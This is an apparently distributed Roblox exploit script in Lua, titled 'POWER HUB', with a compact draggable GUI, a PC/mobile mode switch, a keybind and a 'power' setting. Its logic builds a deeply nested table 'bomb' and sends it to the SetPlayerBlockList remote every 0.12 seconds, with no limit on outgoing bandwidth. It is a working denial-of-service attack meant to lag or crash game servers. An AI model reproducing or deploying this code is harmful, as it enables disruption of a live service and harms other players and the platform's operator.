if not script_key then
    game:GetService("Players").LocalPlayer:Kick("❌ Error: Missing script_key!")
    return
endrepeat task.wait() until game:IsLoaded()
--[[
    POWER HUB⚡️ - Compact Modern Glass Style with Minimize Button
    - Smaller & more compact design
    - Added Minimize / Maximize toggle button (-)
]]

local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local NetworkClient = game:GetService("NetworkClient")

-- Cleanup old GUI
local function CleanupOldGUIs()
    local existing = CoreGui:FindFirstChild("PowerHubBypass")
    if existing then existing:Destroy() end
end
CleanupOldGUIs()

-- Config
local ConfigFile = "PowerHubConfig.json"
local Config = { 
    Keybind = "V", 
    PCPower = 97000,
    MobilePower = 72000,
    Mode = "PC",
}

local function SaveConfig()
    if writefile then
        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
    end
end

local function LoadConfig()
    if isfile and isfile(ConfigFile) then
        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
        if success and data then
            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
        end
    end
end
LoadConfig()

-- Bomb parameters
local DEPTH = 296

local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

-- Compact Glass GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PowerHubBypass"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
MainFrame.BackgroundTransparency = 0.15
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
MainFrame.Size = UDim2.new(0, 220, 0, 195)
MainFrame.ClipsDescendants = true
local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 12)
local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(255, 255, 255)
MainStroke.Thickness = 1.2
MainStroke.Transparency = 0.5

-- Glow effect
local GlowFrame = Instance.new("Frame", MainFrame)
GlowFrame.Size = UDim2.new(1, 0, 1, 0)
GlowFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GlowFrame.BackgroundTransparency = 0.95
GlowFrame.BorderSizePixel = 0
local GlowCorner = Instance.new("UICorner", GlowFrame)
GlowCorner.CornerRadius = UDim.new(0, 12)

-- Header
local Header = Instance.new("Frame")
Header.Parent = MainFrame
Header.BackgroundTransparency = 1
Header.Size = UDim2.new(1, 0, 0, 42)

local Title = Instance.new("TextLabel", Header)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 10, 0, 2)
Title.Size = UDim2.new(0.4, -10, 0, 20)
Title.Font = Enum.Font.GothamBlack
Title.Text = "POWER HUB⚡️"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 13
Title.TextXAlignment = Enum.TextXAlignment.Left

local Subtitle = Instance.new("TextLabel", Header)
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0, 10, 0, 22)
Subtitle.Size = UDim2.new(0.4, -10, 0, 15)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = "compact"
Subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
Subtitle.TextSize = 8
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

-- Mode Switch Button
local ModeSwitchBtn = Instance.new("TextButton", Header)
ModeSwitchBtn.Position = UDim2.new(0.43, 0, 0.5, -11)
ModeSwitchBtn.Size = UDim2.new(0, 52, 0, 22)
ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ModeSwitchBtn.Font = Enum.Font.GothamBold
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOB"
ModeSwitchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ModeSwitchBtn.TextSize = 9
ModeSwitchBtn.AutoButtonColor = false
local ModeCorner = Instance.new("UICorner", ModeSwitchBtn)
ModeCorner.CornerRadius = UDim.new(0, 16)
local ModeStroke = Instance.new("UIStroke", ModeSwitchBtn)
ModeStroke.Color = Color3.fromRGB(200, 200, 200)
ModeStroke.Thickness = 1

-- Minimize / Maximize Toggle Button (-) / (+)
local MinMaxBtn = Instance.new("TextButton", Header)
MinMaxBtn.Position = UDim2.new(0.79, 0, 0.5, -11)
MinMaxBtn.Size = UDim2.new(0, 38, 0, 22)
MinMaxBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
MinMaxBtn.Font = Enum.Font.GothamBold
MinMaxBtn.Text = "-"
MinMaxBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinMaxBtn.TextSize = 12
MinMaxBtn.AutoButtonColor = false
local MinMaxCorner = Instance.new("UICorner", MinMaxBtn)
MinMaxCorner.CornerRadius = UDim.new(0, 16)
local MinMaxStroke = Instance.new("UIStroke", MinMaxBtn)
MinMaxStroke.Color = Color3.fromRGB(200, 200, 200)
MinMaxStroke.Thickness = 1

-- Scroll container
local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Parent = MainFrame
ContentFrame.BackgroundTransparency = 1
ContentFrame.Position = UDim2.new(0, 8, 0, 46)
ContentFrame.Size = UDim2.new(1, -16, 1, -52)
ContentFrame.ScrollBarThickness = 2
ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

local Container = Instance.new("Frame")
Container.Parent = ContentFrame
Container.BackgroundTransparency = 1
Container.Size = UDim2.new(1, 0, 0, 0)

local UIList = Instance.new("UIListLayout", Container)
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 6)

local function updateCanvas()
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Container.AbsoluteSize.Y + 4)
end
UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
task.defer(updateCanvas)

-- ===== PC MODE =====
local PCElements = Instance.new("Frame", Container)
PCElements.Size = UDim2.new(1, 0, 0, 0)
PCElements.BackgroundTransparency = 1
PCElements.Visible = Config.Mode == "PC"

local PCUIList = Instance.new("UIListLayout", PCElements)
PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
PCUIList.Padding = UDim.new(0, 6)

-- Toggle Card
local PCCard = Instance.new("Frame", PCElements)
PCCard.Size = UDim2.new(1, 0, 0, 36)
PCCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
PCCard.BackgroundTransparency = 0.5
local PCCardCorner = Instance.new("UICorner", PCCard)
PCCardCorner.CornerRadius = UDim.new(0, 10)
local PCCardStroke = Instance.new("UIStroke", PCCard)
PCCardStroke.Color = Color3.fromRGB(150, 150, 150)
PCCardStroke.Thickness = 0.5

local PCToggleBtn = Instance.new("TextButton", PCCard)
PCToggleBtn.Size = UDim2.new(1, -16, 1, -8)
PCToggleBtn.Position = UDim2.new(0, 8, 0, 4)
PCToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
PCToggleBtn.Font = Enum.Font.GothamBold
PCToggleBtn.Text = "DISABLED"
PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
PCToggleBtn.TextSize = 11
PCToggleBtn.AutoButtonColor = false
local PCToggleCorner = Instance.new("UICorner", PCToggleBtn)
PCToggleCorner.CornerRadius = UDim.new(0, 6)

-- Keybind Card
local PCKeyCard = Instance.new("Frame", PCElements)
PCKeyCard.Size = UDim2.new(1, 0, 0, 28)
PCKeyCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
PCKeyCard.BackgroundTransparency = 0.5
local PCKeyCorner = Instance.new("UICorner", PCKeyCard)
PCKeyCorner.CornerRadius = UDim.new(0, 10)
local PCKeyStroke = Instance.new("UIStroke", PCKeyCard)
PCKeyStroke.Color = Color3.fromRGB(150, 150, 150)
PCKeyStroke.Thickness = 0.5

local PCKeyLabel = Instance.new("TextLabel", PCKeyCard)
PCKeyLabel.Size = UDim2.new(0.5, -8, 1, 0)
PCKeyLabel.Position = UDim2.new(0, 8, 0, 0)
PCKeyLabel.BackgroundTransparency = 1
PCKeyLabel.Font = Enum.Font.Gotham
PCKeyLabel.Text = "Keybind"
PCKeyLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
PCKeyLabel.TextSize = 10
PCKeyLabel.TextXAlignment = Enum.TextXAlignment.Left

local PCKeybindBtn = Instance.new("TextButton", PCKeyCard)
PCKeybindBtn.Position = UDim2.new(0.65, 0, 0.5, -8)
PCKeybindBtn.Size = UDim2.new(0, 50, 0, 16)
PCKeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
PCKeybindBtn.Font = Enum.Font.GothamBold
PCKeybindBtn.Text = Config.Keybind
PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
PCKeybindBtn.TextSize = 10
local PCKeyCornerBtn = Instance.new("UICorner", PCKeybindBtn)
PCKeyCornerBtn.CornerRadius = UDim.new(0, 5)

-- Power Card
local PCPowerCard = Instance.new("Frame", PCElements)
PCPowerCard.Size = UDim2.new(1, 0, 0, 28)
PCPowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
PCPowerCard.BackgroundTransparency = 0.5
local PCPowerCorner = Instance.new("UICorner", PCPowerCard)
PCPowerCorner.CornerRadius = UDim.new(0, 10)
local PCPowerStroke = Instance.new("UIStroke", PCPowerCard)
PCPowerStroke.Color = Color3.fromRGB(150, 150, 150)
PCPowerStroke.Thickness = 0.5

local PCPowerLabel = Instance.new("TextLabel", PCPowerCard)
PCPowerLabel.Size = UDim2.new(0.5, -8, 1, 0)
PCPowerLabel.Position = UDim2.new(0, 8, 0, 0)
PCPowerLabel.BackgroundTransparency = 1
PCPowerLabel.Font = Enum.Font.Gotham
PCPowerLabel.Text = "Power"
PCPowerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
PCPowerLabel.TextSize = 10
PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local PCPowerInput = Instance.new("TextBox", PCPowerCard)
PCPowerInput.Position = UDim2.new(0.6, 0, 0.5, -8)
PCPowerInput.Size = UDim2.new(0, 60, 0, 16)
PCPowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
PCPowerInput.Font = Enum.Font.GothamBold
PCPowerInput.Text = tostring(Config.PCPower)
PCPowerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
PCPowerInput.TextSize = 9
PCPowerInput.ClearTextOnFocus = false
local PCPowerInputCorner = Instance.new("UICorner", PCPowerInput)
PCPowerInputCorner.CornerRadius = UDim.new(0, 5)

-- Footer
local PCFooter = Instance.new("TextLabel", PCElements)
PCFooter.BackgroundTransparency = 1
PCFooter.Size = UDim2.new(1, 0, 0, 16)
PCFooter.Font = Enum.Font.Gotham
PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
PCFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
PCFooter.TextSize = 8

-- ===== MOBILE MODE =====
local MobileElements = Instance.new("Frame", Container)
MobileElements.Size = UDim2.new(1, 0, 0, 0)
MobileElements.BackgroundTransparency = 1
MobileElements.Visible = Config.Mode == "Mobile"

local MobileUIList = Instance.new("UIListLayout", MobileElements)
MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
MobileUIList.Padding = UDim.new(0, 6)

-- Toggle Card
local MobileCard = Instance.new("Frame", MobileElements)
MobileCard.Size = UDim2.new(1, 0, 0, 36)
MobileCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
MobileCard.BackgroundTransparency = 0.5
local MobileCardCorner = Instance.new("UICorner", MobileCard)
MobileCardCorner.CornerRadius = UDim.new(0, 10)

local MobileToggleBtn = Instance.new("TextButton", MobileCard)
MobileToggleBtn.Size = UDim2.new(1, -16, 1, -8)
MobileToggleBtn.Position = UDim2.new(0, 8, 0, 4)
MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MobileToggleBtn.Font = Enum.Font.GothamBold
MobileToggleBtn.Text = "OFF"
MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
MobileToggleBtn.TextSize = 11
MobileToggleBtn.AutoButtonColor = false
local MobileToggleCorner = Instance.new("UICorner", MobileToggleBtn)
MobileToggleCorner.CornerRadius = UDim.new(0, 6)

-- Power Card
local MobilePowerCard = Instance.new("Frame", MobileElements)
MobilePowerCard.Size = UDim2.new(1, 0, 0, 28)
MobilePowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
MobilePowerCard.BackgroundTransparency = 0.5
local MobilePowerCorner = Instance.new("UICorner", MobilePowerCard)
MobilePowerCorner.CornerRadius = UDim.new(0, 10)

local MobilePowerLabel = Instance.new("TextLabel", MobilePowerCard)
MobilePowerLabel.Size = UDim2.new(0.5, -8, 1, 0)
MobilePowerLabel.Position = UDim2.new(0, 8, 0, 0)
MobilePowerLabel.BackgroundTransparency = 1
MobilePowerLabel.Font = Enum.Font.Gotham
MobilePowerLabel.Text = "Power"
MobilePowerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
MobilePowerLabel.TextSize = 10
MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local MobilePowerInput = Instance.new("TextBox", MobilePowerCard)
MobilePowerInput.Position = UDim2.new(0.6, 0, 0.5, -8)
MobilePowerInput.Size = UDim2.new(0, 60, 0, 16)
MobilePowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
MobilePowerInput.Font = Enum.Font.GothamBold
MobilePowerInput.Text = tostring(Config.MobilePower)
MobilePowerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
MobilePowerInput.TextSize = 9
MobilePowerInput.ClearTextOnFocus = false
local MobilePowerInputCorner = Instance.new("UICorner", MobilePowerInput)
MobilePowerInputCorner.CornerRadius = UDim.new(0, 5)

-- Footer
local MobileFooter = Instance.new("TextLabel", MobileElements)
MobileFooter.BackgroundTransparency = 1
MobileFooter.Size = UDim2.new(1, 0, 0, 16)
MobileFooter.Font = Enum.Font.Gotham
MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
MobileFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
MobileFooter.TextSize = 8

-- ===== LOGIC =====
local running = false
local bomb = nil
local spamThread = nil
local currentMode = Config.Mode
local SPAM_DELAY = 0.12
local isMinimized = false

-- Minimize / Maximize Logic (- / +)
MinMaxBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        MinMaxBtn.Text = "+"
        ContentFrame.Visible = false
        MainFrame:TweenSize(UDim2.new(0, 220, 0, 42), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
    else
        MinMaxBtn.Text = "-"
        MainFrame:TweenSize(UDim2.new(0, 220, 0, 195), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true, function()
            ContentFrame.Visible = true
        end)
    end
end)

local function getCurrentPower()
    return currentMode == "PC" and Config.PCPower or Config.MobilePower
end

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = getCurrentPower()
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(SPAM_DELAY)
            end
        end)
    end
end

local function updateToggleVisuals(enabled)
    if currentMode == "PC" then
        if enabled then
            PCToggleBtn.Text = "ENABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            PCCardStroke.Color = Color3.fromRGB(255, 255, 255)
            MainStroke.Color = Color3.fromRGB(255, 255, 255)
            MainStroke.Transparency = 0
            ModeStroke.Color = Color3.fromRGB(255, 255, 255)
        else
            PCToggleBtn.Text = "DISABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
            PCCardStroke.Color = Color3.fromRGB(150, 150, 150)
            MainStroke.Color = Color3.fromRGB(255, 255, 255)
            MainStroke.Transparency = 0.5
            ModeStroke.Color = Color3.fromRGB(200, 200, 200)
        end
    else
        if enabled then
            MobileToggleBtn.Text = "ON"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            MainStroke.Color = Color3.fromRGB(255, 255, 255)
            MainStroke.Transparency = 0
            ModeStroke.Color = Color3.fromRGB(255, 255, 255)
        else
            MobileToggleBtn.Text = "OFF"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
            MainStroke.Color = Color3.fromRGB(255, 255, 255)
            MainStroke.Transparency = 0.5
            ModeStroke.Color = Color3.fromRGB(200, 200, 200)
        end
    end
end

local function TogglePCBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

local function ToggleMobileBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

local function SwitchMode()
    if running then
        running = false
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
        updateToggleVisuals(false)
    end
    
    currentMode = currentMode == "PC" and "Mobile" or "PC"
    Config.Mode = currentMode
    
    PCElements.Visible = currentMode == "PC"
    MobileElements.Visible = currentMode == "Mobile"
    
    if currentMode == "PC" then
        ModeSwitchBtn.Text = "PC"
        PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
    else
        ModeSwitchBtn.Text = "MOB"
        MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
    end
    
    SaveConfig()
    updateCanvas()
end

PCToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "PC" then TogglePCBypass() end
end)
MobileToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "Mobile" then ToggleMobileBypass() end
end)
ModeSwitchBtn.MouseButton1Click:Connect(SwitchMode)

-- Power inputs
PCPowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(PCPowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 150000)
        Config.PCPower = clampedValue
        PCPowerInput.Text = tostring(clampedValue)
    else
        Config.PCPower = 97000
        PCPowerInput.Text = "97000"
    end
    PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
    SaveConfig()
    if running and currentMode == "PC" then restartSpamLoop() end
end)

MobilePowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(MobilePowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 100000)
        Config.MobilePower = clampedValue
        MobilePowerInput.Text = tostring(clampedValue)
    else
        Config.MobilePower = 72000
        MobilePowerInput.Text = "72000"
    end
    MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
    SaveConfig()
    if running and currentMode == "Mobile" then restartSpamLoop() end
end)

-- Keybind
local listeningForKey = false
PCKeybindBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    PCKeybindBtn.Text = "..."
    PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
end)
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if listeningForKey then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            Config.Keybind = input.KeyCode.Name
            PCKeybindBtn.Text = Config.Keybind
            PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            listeningForKey = false
            SaveConfig()
        end
    else
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
            if currentMode == "PC" then TogglePCBypass() end
        end
    end
end)

-- Draggable
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)

-- Initialize
PCKeybindBtn.Text = Config.Keybind
PCPowerInput.Text = tostring(Config.PCPower)
MobilePowerInput.Text = tostring(Config.MobilePower)
PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
PCElements.Visible = Config.Mode == "PC"
MobileElements.Visible = Config.Mode == "Mobile"
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOB"
updateCanvas()

print("POWER HUB⚡️ Minimized Version Loaded")
